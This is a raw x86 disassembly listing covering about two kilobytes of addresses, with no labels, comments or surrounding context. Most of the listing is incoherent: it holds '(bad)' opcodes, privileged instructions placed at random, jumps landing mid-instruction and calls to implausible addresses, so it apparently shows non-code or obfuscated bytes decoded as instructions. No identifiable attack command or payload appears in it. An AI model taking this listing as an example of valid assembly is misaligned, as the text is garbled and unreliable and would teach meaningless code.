  42943d:	lea    ecx,[eax-0x18]
  429440:	(bad)  
  429441:	push   DWORD PTR [ecx]
  429443:	call   0xffb4e1a5
  429448:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42944c:	fstp   DWORD PTR [esi+ebx*8]
  42944f:	push   ebp
  429450:	pop    ebp
  429451:	mov    esi,DWORD PTR [edx-0x38]
  429454:	add    DWORD PTR [eax],0x28
  429457:	mov    edi,DWORD PTR [ebx]
  429459:	xor    esi,DWORD PTR [edx+0x3]
  42945c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429460:	pop    ebp
  429461:	or     al,0x4
  429463:	inc    ecx
  429464:	push   ebp
  429465:	(bad)  
  429466:	in     al,dx
  429467:	or     ah,ch
  429469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42946a:	xbegin 0xffc80a60
  429470:	clc    
  429471:	adc    al,0x45
  429473:	idiv   BYTE PTR [ecx]
  429475:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42947c:	test   DWORD PTR [eax+0x665300f8],ebx
  429482:	add    BYTE PTR [ecx+0x66],dh
  429485:	add    eax,DWORD PTR [ebp+0x52]
  429488:	adc    eax,0x20
  42948b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429491:	test   DWORD PTR [eax],eax
  429493:	clc    
  429494:	data16 or al,BYTE PTR [ebp+0x45]
  429498:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42949f:	rol    BYTE PTR [ebp+0x45],1
  4294a2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294a8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ae:	push   ebx
  4294af:	add    BYTE PTR [eax+0x0],dl
  4294b2:	push   ecx
  4294b3:	jge    0x4294e8
  4294b5:	add    BYTE PTR [esi+0x4],dl
  4294b8:	jne    0x42951f
  4294ba:	mov    edx,0x457200
  4294bf:	jmp    0x429483
  4294c1:	xor    edi,DWORD PTR [ebx]
  4294c3:	pop    edi
  4294c4:	cvtdq2ps xmm7,xmm0
  4294c7:	ret    0x0
  4294ca:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294d0:	xor    ecx,DWORD PTR [edi]
  4294d2:	add    eax,DWORD PTR [ecx+0x3b]
  4294d5:	push   ebx
  4294d6:	rdpmc  
  4294d8:	out    0x8d,al
  4294da:	add    BYTE PTR [eax],cl
  4294dc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4294e2:	ret    0x450c
  4294e5:	sbb    al,0x8b
  4294e7:	cmp    eax,esi
  4294e9:	or     cl,al
  4294eb:	or     al,0xc2
  4294ed:	pop    eax
  4294ee:	inc    ebp
  4294ef:	add    ecx,DWORD PTR [edi]
  4294f1:	add    esi,DWORD PTR [ebp+0x39]
  4294f4:	invd   
  4294f6:	jge    0x429502
  4294f8:	mov    eax,0x478ac0
  4294fd:	cli    
  4294fe:	xor    esp,ecx
  429500:	mov    ebx,0x5b8ac0
  429505:	ret    0x33
  429508:	mov    eax,0x833a8b
  42950d:	sub    BYTE PTR [ebx],al
  42950f:	inc    ebp
  429510:	data16 cmp al,bh
  429513:	pushf  
  429514:	inc    bh
  429516:	mov    esp,esp
  429518:	hlt    
  429519:	test   DWORD PTR [ebp-0x8],esi
  42951c:	mov    eax,DWORD PTR [ebp-0x14]
  42951f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429525:	dec    edi
  429526:	or     BYTE PTR [eax],al
  429528:	jne    0x4294b3
  42952a:	mov    esi,esp
  42952c:	call   0x77a920f1
  429531:	inc    ebp
  429532:	mov    DWORD PTR [eax+0x984f0c],edi
  429538:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42953e:	add    BYTE PTR [esi+0x7d],ah
  429541:	inc    ebp
  429542:	mov    bx,WORD PTR [ebp+0x8]
  429546:	add    DWORD PTR [ebp+0x50],0x30c008b
  42954d:	inc    ebp
  42954e:	mov    bx,di
  429551:	lock test BYTE PTR [ecx+0x7000801],bh
  429558:	jge    0x42951b
  42955a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429560:	cli    
  429561:	xor    bl,bh
  429563:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429569:	test   BYTE PTR [eax],cl
  42956b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429572:	cmp    ebp,eax
  429574:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42957b:	test   BYTE PTR [ebp+0x1],bh
  42957e:	mov    ebx,0x458a00
  429583:	xor    esi,DWORD PTR [ebx]
  429585:	add    esp,DWORD PTR [esi-0x77]
  429588:	pop    ebp
  429589:	loopne 0x4295f1
  42958b:	inc    ebp
  42958c:	clc    
  42958d:	xor    edi,DWORD PTR [ebx]
  42958f:	add    esi,DWORD PTR [edx-0x77]
  429592:	data16 fdivr QWORD PTR [ebp-0x49]
  429596:	mov    ebx,0xb78afc
  42959b:	hlt    
  42959c:	xor    esi,DWORD PTR [esi]
  42959e:	data16 add BYTE PTR [ebp+0x66],bl
  4295a2:	data16 lock clc 
  4295a5:	cmp    eax,DWORD PTR ss:[eax]
  4295a8:	ja     0x429610
  4295aa:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ae:	ltr    WORD PTR [ebp+0x66]
  4295b2:	add    esi,eax
  4295b4:	add    di,WORD PTR [ebp+0x2b]
  4295b8:	data16 data16 jge 0x429639
  4295bc:	mov    ebx,0xe08a8b
  4295c1:	jge    0x4295f6
  4295c3:	data16 data16 xor al,0x5d
  4295c7:	data16 data16 jne 0x4295c3
  4295cb:	mov    edi,DWORD PTR [ebx]
  4295cd:	fdiv   QWORD PTR [edx+0x7d]
  4295d0:	data16 data16 jge 0x429608
  4295d4:	mov    ebx,0x758a66
  4295d9:	mov    esi,0x667233
  4295de:	pop    ebp
  4295df:	or     BYTE PTR [esi+0x0],ah
  4295e2:	clc    
  4295e3:	mov    edi,DWORD PTR [ebx]
  4295e5:	lock ja 0x429573
  4295e8:	(bad)  
  4295ea:	jge    0x4295e3
  4295ec:	invd   
  4295ee:	pop    ebp
  4295ef:	add    BYTE PTR [ebx],al
  4295f1:	(bad)  
  4295f2:	cmp    di,WORD PTR [ebp+0xf]
  4295f6:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4295fa:	mov    bx,WORD PTR [ebp-0x10]
  4295fe:	pop    bp
  429600:	fbstp  TBYTE PTR [ebx]
  429602:	test   DWORD PTR [ebx],eax
  429604:	add    BYTE PTR [ebx],bh
  429606:	add    BYTE PTR [esi+0x7d],ah
  429609:	jge    0x429596
  42960b:	data16 in al,dx
  42960d:	pop    ebp
  42960e:	stc    
  42960f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429616:	mov    edi,ebx
  429618:	in     al,dx
  429619:	test   BYTE PTR [ebp+0x0],bh
  42961c:	mov    eax,DWORD PTR [eax]
  42961e:	call   0xbd3f8fae
  429623:	ss cwde 
  429625:	add    BYTE PTR [edx],dh
  429627:	mov    bx,di
  42962a:	call   0x8b4b13ba
  42962f:	add    ebp,esp
  429631:	mov    bx,di
  429634:	jnp    0x42965c
  429636:	mov    DWORD PTR [ebx+0x367df808],ecx
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0x7c3e21a9
  429643:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429649:	data16 data16 fistp WORD PTR [ebp+0xe]
  42964e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429658:	fisttp WORD PTR [ecx-0x7401f77b]
  42965e:	(bad)  
  42965f:	cld    
  429660:	jne    0x429698
  429662:	xor    eax,DWORD PTR [eax]
  429664:	mov    esp,DWORD PTR [esi-0x10]
  429667:	sti    
  429668:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42966f:	data16 adc bl,bh
  429672:	push   ebp
  429673:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42967a:	mov    WORD PTR [eax],es
  42967c:	cwde   
  42967d:	data16 xor bh,bl
  429680:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429686:	mov    esp,DWORD PTR [esi-0x14]
  429689:	fisttp WORD PTR [ebx-0x3748a9f2]
  42968f:	or     al,0x2b
  429691:	mov    bh,0xba
  429693:	hlt    
  429694:	mov    bh,bl
  429696:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42969c:	dec    edi
  42969d:	or     al,0x0
  42969f:	mov    edi,DWORD PTR [ebx]
  4296a1:	or     BYTE PTR [ebp+0x3b],dh
  4296a4:	mov    ecx,DWORD PTR [edi]
  4296a6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296ac:	xor    al,0xd8
  4296ae:	pop    bp
  4296b0:	lock xor esi,DWORD PTR [ebx]
  4296b3:	lea    esp,[esi+0x1f]
  4296b6:	icebp  
  4296b7:	jb     0x4296bd
  4296b9:	add    al,al
  4296bb:	jge    0x4296c9
  4296bd:	mov    eax,eax
  4296bf:	fsubr  st,st(3)
  4296c1:	pop    ebp
  4296c2:	mov    esi,DWORD PTR [ebx]
  4296c4:	in     al,0x8d
  4296c6:	rcr    DWORD PTR [edi],0xc2
  4296c9:	jb     0x429729
  4296cb:	add    cl,cl
  4296cd:	jge    0x4296db
  4296cf:	mov    edx,DWORD PTR [ebp-0x20]
  4296d2:	in     al,dx
  4296d3:	pop    ebp
  4296d4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296d9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296dd:	mov    ebp,DWORD PTR [ebx]
  4296df:	fdivr  QWORD PTR [esi+0x668a5d]
  4296e5:	cmp    al,0x33
  4296e7:	mov    si,0x4f7d
  4296eb:	mov    eax,DWORD PTR [eax]
  4296ed:	lock inc ebp
  4296ef:	mov    esi,DWORD PTR [edi]
  4296f1:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4296f8:	clc    
  4296f9:	(bad)  
  4296fa:	cmp    edi,DWORD PTR [ebx]
  4296fc:	je     0x42970d
  4296fe:	push   ebx
  4296ff:	loopne 0x429710
  429701:	dec    ecx
  429703:	mov    ebp,DWORD PTR [eax-0x1c]
  429706:	int    0xf1
  429708:	mov    esi,0x703084d
  42970d:	orps   xmm6,xmm1
  429710:	add    BYTE PTR [ebp+0x66],dh
  429713:	jmp    0x4296e0
  429715:	mov    eax,DWORD PTR [ebx]
  429717:	lock push ebp
  429719:	ror    DWORD PTR [ebp-0x2972feb3],1
  42971f:	or     bh,dl
  429721:	jb     0x429721
  429723:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429729:	loopne 0x42972b
  42972b:	jne    0x429729
  42972d:	data16 add BYTE PTR [esi+eiz*2],dh
  429731:	mov    ecx,ebx
  429733:	data16 ss icebp 
  429736:	add    BYTE PTR [esi],dh
  429738:	data16 add bl,cl
  42973b:	data16 xor dh,dl
  42973e:	add    BYTE PTR [edx],dh
  429740:	data16 add bl,cl
  429743:	enterw 0x4df1,0x19
  429748:	pop    edi
  429749:	jne    0x4296cc
  42974b:	mov    esi,DWORD PTR [edi]
  42974d:	call   0x77b722ee
  429752:	xor    ebp,DWORD PTR [ebx]
  429754:	lea    esp,[esi+0x48]
  429757:	repnz in eax,0x3b
  42975a:	add    BYTE PTR [ebp-0x37],dh
  42975d:	xor    edx,DWORD PTR [ebp-0x15]
  429760:	in     al,dx
  429761:	xor    edx,DWORD PTR [esi+0x40]
  429764:	mov    DWORD PTR [edi],0x338545fc
  42976a:	clc    
  42976b:	add    edi,DWORD PTR [eax]
  42976d:	pop    edi
  42976e:	pushf  
  42976f:	pop    ebx
  429770:	call   0xff439737
  429775:	mov    edi,eax
  429777:	push   ecx
  429778:	pop    es
  429779:	mov    edi,DWORD PTR [ebx]
  42977b:	push   esi
  42977c:	inc    ebx
  42977d:	cld    
  42977e:	js     0x429780
  429780:	popa   
  429781:	data16 (bad) 
  429783:	into   
  429784:	push   0xb900cd36
  429789:	data16 or dh,cl
  42978c:	pop    es
  42978d:	xor    ah,BYTE PTR [esi+0x0]
  429790:	add    bh,al
  429792:	cld    
  429793:	cld    
  429794:	add    BYTE PTR [ebp+0x38c3f866],al
  42979a:	ss pushf 
  42979c:	add    BYTE PTR [esi+0x66],ah
  42979f:	into   
  4297a0:	ret    
  4297a1:	pop    ebp
  4297a2:	add    al,0x57
  4297a4:	add    BYTE PTR [edi-0x723c409a],dh
  4297aa:	add    edi,edi
  4297ac:	jne    0x4297fe
  4297ae:	lea    edx,[ecx+0x1]
  4297b1:	mov    ebx,0xd64ff1
  4297b6:	sar    DWORD PTR [ebx],1
  4297b8:	test   BYTE PTR [ebp+0x30],dh
  4297bb:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297bf:	push   edi
  4297c0:	xor    BYTE PTR [ebx],0x3b
  4297c3:	mov    esi,ebx
  4297c5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297cb:	xor    BYTE PTR [ebp+0x64],al
  4297ce:	pop    ebx
  4297cf:	mov    ebx,0x9c3a37
  4297d4:	je     0x429801
  4297d6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297dc:	mov    WORD PTR [ebx],?
  4297de:	xor    BYTE PTR [ebx+0x8b4f64],bh
  4297e4:	pop    edi
  4297e5:	cmp    ecx,ecx
  4297e7:	jne    0x42983e
  4297e9:	mov    ebp,esp
  4297eb:	cld    
  4297ec:	push   esi
  4297ed:	pop    ebx
  4297ee:	inc    ebp
  4297ef:	stc    
  4297f0:	aaa    
  4297f1:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  4297f8:	clc    
  4297f9:	test   dl,dl
  4297fb:	xor    bh,bh
  4297fd:	fs pop si
  429800:	or     bl,al
  429802:	cld    
  429803:	mov    eax,DWORD PTR [eax]
  429805:	push   ecx
  429806:	push   di
  429808:	retf   0x3645
  42980b:	aaa    
  42980c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429813:	clc    
  429814:	add    BYTE PTR [ebx+0x66],bl
  429817:	dec    edx
  429819:	mov    edx,DWORD PTR [edi-0x76]
  42981c:	push   edi
  42981d:	add    al,0xb7
  42981f:	xor    al,0xba
  429821:	cmp    al,0x8d
  429823:	je     0x429824
  429825:	mov    edx,DWORD PTR [eax-0x46]
  429828:	push   ecx
  429829:	lea    edi,[ebx+0x504fff]
  42982f:	push   ecx
  429830:	cmp    edx,DWORD PTR [ebx+0x75]
  429833:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429839:	add    BYTE PTR [ebx],dh
  42983b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429841:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429848:	mov    ebx,0x3b3a00
  42984d:	jne    0x42987a
  42984f:	mov    DWORD PTR [ebx+0x728afc],edi
  429855:	xor    esi,DWORD PTR [ebx]
  429857:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42985d:	push   edi
  42985e:	cmp    esp,ebp
  429860:	jne    0x429862
  429862:	sbb    DWORD PTR [eax],0x8085c3fc
  429868:	clc    
  429869:	inc    ebx
  42986a:	pop    ebx
  42986b:	sti    
  42986c:	add    eax,0xeb8bc075
  429871:	cld    
  429872:	xor    edi,DWORD PTR ds:0xf8c3855e
  429878:	mov    ecx,DWORD PTR [ecx+edx*2]
  42987b:	rol    DWORD PTR [ebp-0x37],0xf
  42987f:	mov    DWORD PTR [eax],ecx
  429881:	inc    edi
  429882:	(bad)  
  429883:	in     eax,0x4
  429885:	add    bh,bh
  429887:	(bad)  
  429888:	mov    esi,0xc38a5e
  42988d:	mov    esi,DWORD PTR [ebx]
  42988f:	push   ecx
  429890:	mov    edi,0xfc4fc7
  429895:	test   DWORD PTR [ebp-0x8],edx
  429898:	data16 cmp bh,al
  42989b:	pushf  
  42989c:	sub    ebp,eax
  42989e:	inc    ebp
  42989f:	(bad)  
  4298a0:	sub    edi,edi
  4298a2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298a8:	inc    ebp
  4298a9:	add    BYTE PTR [esi+0x2b],ah
  4298ac:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298b2:	cmp    al,0x33
  4298b4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [ebx]
  4298bd:	je     0x429877
  4298bf:	push   ebx
  4298c0:	dec    edi
  4298c1:	str    ecx
  4298c4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298c7:	int    0x33
  4298c9:	mov    edi,0x789085f
  4298ce:	mov    eax,DWORD PTR [esp+edi*8]
  4298d1:	add    cl,cl
  4298d3:	data16 add al,0xcb
  4298d6:	push   ebp
  4298d7:	add    ebp,esp
  4298d9:	jne    0x4298c7
  4298db:	(bad)  
  4298dc:	mov    DWORD PTR [ecx],0xd685f7ec
  4298e2:	clc    
  4298e3:	xlat   BYTE PTR ds:[ebx]
  4298e4:	inc    ebp
  4298e5:	mov    edi,DWORD PTR [ecx]
  4298e7:	push   eax
  4298e8:	pushf  
  4298e9:	in     eax,0x8b
  4298eb:	add    ah,ch
  4298ed:	cld    
  4298ee:	push   eax
  4298ef:	add    BYTE PTR [ecx+0x66],dl
  4298f2:	add    eax,0x3672cb
  4298f7:	add    BYTE PTR [ebp+0x66],al
  4298fa:	(bad)  
  4298fb:	retf   
  4298fc:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429903:	retf   
  429904:	cmp    al,0xc8
  429906:	pushf  
  429907:	jge    0x4298d0
  429909:	aaa    
  42990a:	cld    
  42990b:	pushf  
  42990c:	test   DWORD PTR [edi-0x8],ebx
  42990f:	je     0x429956
  429911:	xor    esi,DWORD PTR ds:0x7020840
  429917:	ror    BYTE PTR [ebp-0x37],0x8d
  42991b:	push   ebp
  42991c:	add    esp,ebp
  42991e:	jb     0x4298ab
  429920:	add    BYTE PTR [eax],cl
  429922:	dec    ebp
  429923:	mov    bh,0x81
  429925:	push   esi
  429926:	push   eax
  429927:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42992e:	xor    al,BYTE PTR [eax]
  429930:	mov    edx,DWORD PTR [edi+0x10]
  429933:	(bad)  
  429934:	scas   eax,DWORD PTR es:[edi]
  429935:	xor    bh,BYTE PTR [ebx]
  429937:	add    BYTE PTR [edi],cl
  429939:	mov    ebp,ebp
  42993b:	cld    
  42993c:	add    BYTE PTR [ebx],bh
  42993e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429942:	dec    ebp
  429943:	or     BYTE PTR [ebx],ch
  429945:	ret    0x458b
  429948:	lock jmp 0x42993c
  42994b:	mov    ecx,DWORD PTR [eax]
  42994d:	or     BYTE PTR [edi],al
  42994f:	mov    ecx,eax
  429951:	xor    DWORD PTR [edx+0x2],0x0
  429955:	mov    bh,0xc1
  429957:	adc    BYTE PTR [eax],dh
  429959:	iret   
  42995a:	inc    ebp
  42995b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429961:	inc    BYTE PTR [ebx]
  429963:	xor    bh,al
  429965:	add    BYTE PTR [ecx],dl
  429967:	data16 adc al,bh
  42996a:	dec    ecx
  42996b:	fisttp WORD PTR [ecx+0x456604c0]
  429971:	add    dh,BYTE PTR ds:0x75e0845
  429977:	ret    0x4d
  42997a:	lea    ecx,[ebx+0x18728301]
  429980:	add    BYTE PTR [ebp+0x45],al
  429983:	cmp    cl,ch
  429985:	pushf  
  429986:	add    bh,al
  429988:	add    al,ch
  42998a:	inc    ebp
  42998b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429991:	xor    eax,0x781084d
  429996:	push   eax
  429997:	cwde   
  429998:	push   ecx
  429999:	xor    al,BYTE PTR [ecx+0x32f89889]
  42999f:	inc    ebp
  4299a0:	cmp    esp,DWORD PTR [eax]
  4299a2:	jbe    0x429940
  4299a4:	mov    eax,edi
  4299a6:	or     ah,dh
  4299a8:	inc    ebp
  4299a9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299af:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299b5:	in     al,dx
  4299b6:	hlt    
  4299b7:	push   eax
  4299b8:	push   eax
  4299b9:	push   ecx
  4299ba:	push   ecx
  4299bb:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299c1:	cwde   
  4299c2:	cwde   
  4299c3:	xor    dh,BYTE PTR [edx]
  4299c5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299cb:	or     BYTE PTR [ebp+0x7],al
  4299ce:	mov    eax,ecx
  4299d0:	clc    
  4299d1:	jb     0x429994
  4299d3:	add    BYTE PTR [ebp+0x55],cl
  4299d6:	or     DWORD PTR [edi],0xc251d150
  4299dc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  4299e6:	mov    edi,eax
  4299e8:	or     cl,al
  4299ea:	inc    ebp
  4299eb:	dec    ebp
  4299ec:	mov    eax,DWORD PTR [ecx+0x514d500c]
  4299f2:	or     WORD PTR [ecx],0x8998
  4299f7:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  4299fd:	mov    edx,DWORD PTR [ecx+0x8]
  429a00:	mov    eax,DWORD PTR [ebp-0x8]
  429a03:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a0a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a10:	inc    ebp
  429a11:	dec    eax
  429a12:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a18:	add    edx,DWORD PTR [ecx-0x8]
  429a1b:	mov    ecx,DWORD PTR [ecx]
  429a1d:	clc    
  429a1e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a25:	mov    ecx,ebp
  429a27:	clc    
  429a28:	(bad)  
  429a29:	popf   
  429a2a:	inc    DWORD PTR [eax]
  429a2c:	ret    0x8b
  429a2f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a35:	mov    edi,esp
  429a37:	hlt    
  429a38:	test   ecx,esi
  429a3a:	clc    
  429a3b:	or     BYTE PTR [ebp+0x7],al
  429a3e:	cmp    ecx,eax
  429a40:	pushf  
  429a41:	jb     0x429a76
  429a43:	add    BYTE PTR [eax-0x3f],al
  429a46:	inc    eax
  429a47:	daa    
  429a48:	inc    ebp
  429a49:	inc    ebp
  429a4a:	xor    eax,0x7f80803
  429a4f:	dec    ebp
  429a50:	cwde   
  429a51:	add    esi,DWORD PTR [edx]
  429a53:	clc    
  429a54:	cmp    DWORD PTR [ecx],ecx
  429a56:	or     al,0x8
  429a58:	add    al,BYTE PTR [ebp+0x2c]
  429a5b:	xor    eax,0x7350845
  429a60:	or     BYTE PTR [ebp+0x7],cl
  429a63:	lea    ebx,[eax-0x748dcdff]
  429a69:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a70:	mov    edx,DWORD PTR [eax]
  429a72:	cld    
  429a73:	dec    ebp
  429a74:	push   eax
  429a75:	sub    edx,DWORD PTR [ecx-0x75]
  429a78:	add    eax,0xf172fc
  429a7d:	or     BYTE PTR [ebp+0x7],cl
  429a80:	add    eax,ecx
  429a82:	or     al,0x72
  429a84:	add    DWORD PTR [eax],eax
  429a86:	mov    ebx,0x29c2c1
  429a8b:	inc    ebp
  429a8c:	mov    eax,DWORD PTR [ebx]
  429a8e:	cmp    eax,0x3004d1c
  429a94:	xbegin 0x66c8268e
  429a9a:	clc    
  429a9b:	or     BYTE PTR [ebp+0x45],al
  429a9e:	cmp    DWORD PTR ds:0x78b089c,esi
  429aa4:	adc    BYTE PTR [ebp+0x45],cl
  429aa7:	lea    eax,[ebp+0x33727501]
  429aad:	add    cl,ch
  429aaf:	inc    ebp
  429ab0:	add    bl,ch
  429ab2:	add    BYTE PTR [ebx+0x45850845],cl
  429ab8:	je     0x429a45
  429aba:	push   ebx
  429abb:	or     al,0x85
  429abd:	dec    ebp
  429abe:	std    
  429abf:	mov    bh,bh
  429ac1:	mov    BYTE PTR [ebp-0x75],al
  429ac4:	mov    edi,eax
  429ac6:	or     al,0x89
  429ac8:	inc    ebp
  429ac9:	clc    
  429aca:	mov    esp,esp
  429acc:	hlt    
  429acd:	call   DWORD PTR [edi-0x37]
  429ad0:	push   eax
  429ad1:	or     al,0x51
  429ad3:	push   ebp
  429ad4:	xor    ebp,esp
  429ad6:	mov    esi,0x457251
  429adb:	cmp    dh,al
  429add:	pushf  
  429ade:	inc    ebp
  429adf:	(bad)  
  429ae0:	mov    edi,eax
  429ae2:	or     al,0x85
  429ae4:	add    al,bh
  429ae6:	inc    eax
  429ae8:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429aec:	or     ah,bh
  429aee:	inc    eax
  429aef:	push   eax
  429af0:	jmp    0x429b43
  429af2:	mov    eax,DWORD PTR ds:0xe8720c
  429af8:	mov    DWORD PTR [ebp-0x8],eax
  429afb:	jne    0x429b42
  429afd:	jmp    0x429a8a
  429aff:	mov    ebp,DWORD PTR [eax]
  429b01:	clc    
  429b02:	retf   0xff50
  429b05:	push   ecx
  429b06:	mov    DWORD PTR ds:0x757210,eax
  429b0c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b0f:	sub    esp,DWORD PTR [ebx-0x77]
  429b12:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b19:	or     ah,bh
  429b1b:	pop    es
  429b1c:	ds cwde 
  429b1e:	push   DWORD PTR [edx]
  429b20:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b26:	(bad)  
  429b27:	mov    bh,bh
  429b29:	jmp    0x429b17
  429b2b:	leave  
  429b2c:	jne    0x429b36
  429b2e:	call   0x2f9488
  429b33:	in     al,dx
  429b34:	dec    ebp
  429b35:	add    dh,BYTE PTR [ebx]
  429b37:	add    BYTE PTR [ebx],al
  429b39:	inc    ebp
  429b3a:	cmp    edi,DWORD PTR [eax]
  429b3c:	je     0x429ada
  429b3e:	mov    eax,edi
  429b40:	or     al,0xf0
  429b42:	add    BYTE PTR [ebp+0x458bf845],al
  429b48:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b4e:	adc    al,0x7
  429b50:	enter  0x9fc0,0xa5
  429b54:	rol    BYTE PTR [eax],0x5e
  429b57:	mov    ecx,ecx
  429b59:	or     al,0xc
  429b5b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b62:	jmp    0x429b63
  429b64:	push   ebp
  429b65:	mov    esp,ebp
  429b67:	cld    
  429b68:	inc    ebp
  429b69:	inc    ebp
  429b6a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b71:	push   esi
  429b72:	push   esi
  429b73:	mov    edi,0x7af080f
  429b78:	add    bh,al
  429b7a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429b80:	add    BYTE PTR [ecx+0x4540100f],cl
  429b86:	mov    ebp,eax
  429b88:	mov    ebp,edi
  429b8a:	lock call edx
  429b8d:	fcom   DWORD PTR [ebp+0x45]
  429b90:	mov    eax,0x148a8b
  429b95:	push   ecx
  429b96:	enter  0xc145,0x83
  429b9a:	cmp    cl,BYTE PTR [eax]
  429b9c:	add    BYTE PTR [ebp+0x4d],al
  429b9f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429ba5:	call   0xffa29714
  429baa:	cmp    eax,DWORD PTR [ebp-0xc]
  429bad:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bb1:	push   ebp
  429bb2:	(bad)
  429bb5:	std    
  429bb6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bbd:	inc    ebp
  429bbe:	(bad)  
  429bbf:	call   0xff7c984f
  429bc4:	add    al,BYTE PTR [ebp+0x37]
  429bc7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bcd:	jne    0x429bcf
  429bcf:	(bad)  
  429bd0:	cmp    edi,esp
  429bd2:	jne    0x429c05
  429bd4:	mov    edi,edi
  429bd6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bdc:	pop    ds
  429bdd:	into   
  429bde:	je     0x429ba1
  429be0:	mov    ebx,DWORD PTR [esi]
  429be2:	or     BYTE PTR [ebp-0x49],al
  429be5:	mov    esp,DWORD PTR [esi-0x77]
  429be8:	mov    esi,0xfc451f0c
  429bed:	mov    eax,DWORD PTR [eax]
  429bef:	or     al,0x66
  429bf1:	sar    bl,0x3b
  429bf4:	xor    esi,DWORD PTR [ebp+0x66]
  429bf7:	xor    ecx,edi
  429bf9:	pop    edi
  429bfa:	adc    bl,BYTE PTR [ebx+0x78]
  429bfd:	ret    0xff
  429c00:	cld    
  429c01:	inc    ebp
  429c02:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c08:	cld    
  429c09:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c10:	push   0xffffff83
  429c12:	pop    edi
  429c13:	or     BYTE PTR [ebp+0x53],dh
  429c16:	xorps  xmm1,xmm2
  429c19:	test   BYTE PTR [eax+eax*1],bh
  429c1c:	add    BYTE PTR [eax],al
  429c1e:	adc    eax,eax
  429c20:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c28:	jmp    DWORD PTR [eax]
  429c2a:	ror    al,0x5e
  429c2d:	inc    ebp
  429c2e:	leave  
  429c2f:	xor    ecx,DWORD PTR [eax]
  429c31:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c37:	add    ch,al
  429c39:	xor    edi,edi
  429c3b:	xor    DWORD PTR [ebx],0x660033fc
  429c41:	mov    DWORD PTR [ebp-0xc],ecx
  429c44:	pcmpgtw mm0,mm0
  429c47:	add    dl,ah
  429c49:	leave  
  429c4a:	mov    edi,DWORD PTR [esi-0x7d]
  429c4d:	push   ax
  429c4f:	dec    ebp
  429c50:	mov    esi,DWORD PTR [ebx-0x75]
  429c53:	lea    ebp,[eax-0x7c00fffc]
  429c59:	xor    eax,DWORD PTR [eax]
  429c5b:	sysret 
  429c5d:	dec    ebp
